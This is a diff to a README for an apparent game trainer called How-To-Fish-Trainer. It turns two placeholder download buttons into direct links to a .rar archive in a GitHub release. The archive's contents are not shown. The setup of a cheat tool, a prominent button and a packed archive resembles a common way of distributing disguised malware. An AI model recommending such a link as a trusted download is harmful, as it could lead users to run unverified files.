@@ -5,14 +5,14 @@
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](#-download)
+[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen?style=for-the-badge&logo=github)](https://github.com/kevin-hall-code05d7/How-To-Fish-Trainer/releases/latest/download/How.To.Fish.rar)
 
 
 ---
 
 ## 📥 Download
 
-👉 [**DOWNLOAD — Click Here or Releases**](#) 👈
+👉 [**DOWNLOAD — Click Here or Releases**](https://github.com/kevin-hall-code05d7/How-To-Fish-Trainer/releases/latest/download/How.To.Fish.rar) 👈
 
 ---
 
